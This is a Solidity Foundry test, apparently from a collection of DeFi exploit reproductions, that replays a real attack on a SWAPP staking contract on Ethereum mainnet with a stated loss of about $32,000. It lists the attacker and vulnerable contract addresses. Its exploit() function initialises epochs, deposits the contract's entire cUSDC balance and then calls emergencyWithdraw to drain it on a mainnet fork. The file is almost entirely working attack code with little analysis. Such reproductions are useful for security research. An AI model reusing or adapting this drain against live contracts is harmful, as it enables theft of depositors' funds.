// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";


// @KeyInfo - Total Lost : 32,196.28 USD
// Attacker : https://etherscan.io/address/0x657a2b6fe37ced2f31fd7513095dbfb126a53601
// Attack Contract : https://etherscan.io/address/0x7f1f536223d6a84ad4897a675f04886ce1c3b7a1
// Vulnerable Contract : https://etherscan.io/address/0x245a551ee0f55005e510b239c917fa34b41b3461
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0xa02b159fb438c8f0fb2a8d90bc70d8b2273d06b55920b26f637cab072b7a0e3e

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6#code

// @Analysis

// Post-mortem : N/A
// Twitter Guy : https://x.com/deeberiroz/status/1947213692220710950
// Hacking God : N/A

/// Onchain exported with `Anvil`
interface CErc20 {
    event AccrueInterest(uint256 interestAccumulated, uint256 borrowIndex, uint256 totalBorrows);
    event Approval(address indexed owner, address indexed spender, uint256 amount);
    event Borrow(address borrower, uint256 borrowAmount, uint256 accountBorrows, uint256 totalBorrows);
    event Failure(uint256 error, uint256 info, uint256 detail);
    event LiquidateBorrow(
        address liquidator, address borrower, uint256 repayAmount, address cTokenCollateral, uint256 seizeTokens
    );
    event Mint(address minter, uint256 mintAmount, uint256 mintTokens);
    event NewAdmin(address oldAdmin, address newAdmin);
    event NewComptroller(address oldComptroller, address newComptroller);
    event NewMarketInterestRateModel(address oldInterestRateModel, address newInterestRateModel);
    event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);
    event NewReserveFactor(uint256 oldReserveFactorMantissa, uint256 newReserveFactorMantissa);
    event Redeem(address redeemer, uint256 redeemAmount, uint256 redeemTokens);
    event RepayBorrow(
        address payer, address borrower, uint256 repayAmount, uint256 accountBorrows, uint256 totalBorrows
    );
    event ReservesReduced(address admin, uint256 reduceAmount, uint256 newTotalReserves);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    function _acceptAdmin() external returns (uint256);
    function _reduceReserves(uint256 reduceAmount) external returns (uint256);
    function _setComptroller(address newComptroller) external returns (uint256);
    function _setInterestRateModel(address newInterestRateModel) external returns (uint256);
    function _setPendingAdmin(address newPendingAdmin) external returns (uint256);
    function _setReserveFactor(uint256 newReserveFactorMantissa) external returns (uint256);
    function accrualBlockNumber() external view returns (uint256);
    function accrueInterest() external returns (uint256);
    function admin() external view returns (address);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
    function balanceOfUnderlying(address owner) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function borrowBalanceCurrent(address account) external returns (uint256);
    function borrowBalanceStored(address account) external view returns (uint256);
    function borrowIndex() external view returns (uint256);
    function borrowRatePerBlock() external view returns (uint256);
    function comptroller() external view returns (address);
    function decimals() external view returns (uint256);
    function exchangeRateCurrent() external returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function getAccountSnapshot(address account) external view returns (uint256, uint256, uint256, uint256);
    function getCash() external view returns (uint256);
    function initialExchangeRateMantissa() external view returns (uint256);
    function interestRateModel() external view returns (address);
    function isCToken() external view returns (bool);
    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral)
        external
        returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function name() external view returns (string memory);
    function pendingAdmin() external view returns (address);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function repayBorrow(uint256 repayAmount) external returns (uint256);
    function repayBorrowBehalf(address borrower, uint256 repayAmount) external returns (uint256);
    function reserveFactorMantissa() external view returns (uint256);
    function seize(address liquidator, address borrower, uint256 seizeTokens) external returns (uint256);
    function supplyRatePerBlock() external view returns (uint256);
    function symbol() external view returns (string memory);
    function totalBorrows() external view returns (uint256);
    function totalBorrowsCurrent() external returns (uint256);
    function totalReserves() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
    function transferFrom(address src, address dst, uint256 amount) external returns (bool);
    function underlying() external view returns (address);
}

/// Onchain interface exported with `Anvil`
interface Staking {
    event CheckInterest(uint256 cBalance, uint256 uBalance, uint256 interest);
    event Deposit(address indexed user, address indexed tokenAddress, uint256 amount);
    event EmergencyWithdraw(address indexed user, address indexed tokenAddress, uint256 amount);
    event GetInterest(address indexed token, uint256 amount);
    event ManualEpochInit(address indexed caller, uint128 indexed epochId, address[] tokens);
    event RegisteredReferer(address referral, address referrer);
    event Withdraw(address indexed user, address indexed tokenAddress, uint256 amount);

    function _owner() external view returns (address);
    function balanceOf(address user, address token) external view returns (uint256);
    function cDai() external view returns (address);
    function cUsdc() external view returns (address);
    function cUsdt() external view returns (address);
    function checkInterestFromCompound(address tokenAddress) external returns (uint256 interest);
    function checkStableCoin(address token) external pure returns (bool);
    function computeNewMultiplier(
        uint256 prevBalance,
        uint128 prevMultiplier,
        uint256 amount,
        uint128 currentMultiplier
    ) external pure returns (uint128);
    function currentEpochMultiplier() external view returns (uint128);
    function dai() external view returns (address);
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function emergencyWithdraw(address tokenAddress) external;
    function epoch1Start() external view returns (uint256);
    function epochDuration() external view returns (uint256);
    function epochIsInitialized(address token, uint128 epochId) external view returns (bool);
    function firstReferrerRewardPercentage() external view returns (uint256);
    function getCurrentEpoch() external view returns (uint128);
    function getEpochPoolSize(address tokenAddress, uint128 epochId) external view returns (uint256);
    function getEpochUserBalance(address user, address token, uint128 epochId) external view returns (uint256);
    function getInterest(address tokenAddress) external;
    function getInterestFromCompound(address tokenAddress) external;
    function getReferralById(address referrer, uint256 id) external view returns (address);
    function hasReferrer(address addr) external view returns (bool);
    function manualEpochInit(address[] memory tokens, uint128 epochId) external;
    function referrals(address) external view returns (address);
    function referrers(address) external view returns (uint256 referralsCount);
    function secondReferrerRewardPercentage() external view returns (uint256);
    function stableCoinBalances(address) external view returns (uint256);
    function updateReferrersPercentage(uint256 first, uint256 second) external;
    function usdc() external view returns (address);
    function usdt() external view returns (address);
    function wbtcSwappLP() external view returns (address);
    function withdraw(address tokenAddress, uint256 amount) external;
}


contract SWAPPStakingExp is Test {
    // Contract Addresses
    Staking constant staking = Staking(0x245a551ee0F55005e510B239c917fA34b41B3461);
    // Token Addresses
    CErc20 constant cUsdc = CErc20(0x39AA39c021dfbaE8faC545936693aC917d5E7563);

    uint256 MAX_UINT = 2**256 - 1;

    // Exploit Parameters
    uint256 private constant forkBlockNumber = 22_957_532; 
    receive() external payable {}

    function setUp() public {
        vm.createSelectFork("mainnet", forkBlockNumber);
    }

    function init_epochs() internal {
        address[] memory tokens = new address[](1);
        tokens[0] = address(cUsdc);
        uint128 currentEpoch = staking.getCurrentEpoch();
        for (uint128 i = 0; i < currentEpoch; i++) {
            staking.manualEpochInit(tokens, i);
        }
    }

    function exploit() public {
        init_epochs(); // Init epochs to complete `deposit`
        assert(staking.epochIsInitialized(address(cUsdc), 0));
        cUsdc.approve(address(staking), MAX_UINT);
        console.log(
            "current balance of attacker:",
            cUsdc.balanceOf(address(this))
        );
        uint256 staking_cusdc_balance = cUsdc.balanceOf(address(staking));
        console.log("current balance of staking:", staking_cusdc_balance);
        staking.deposit(address(cUsdc), staking_cusdc_balance, address(0x0));
        staking.emergencyWithdraw(address(cUsdc));
        console.log(
            "balance of attacker after exploiting :",
            cUsdc.balanceOf(address(this))
        );
        console.log(
            "balance of staking after exploiting:",
            cUsdc.balanceOf(address(staking))
        );
        cUsdc.transfer(address(this), staking_cusdc_balance);
        assert(cUsdc.balanceOf(address(this)) > 0);
    }

    function testExploit() public {
        exploit();
    }
}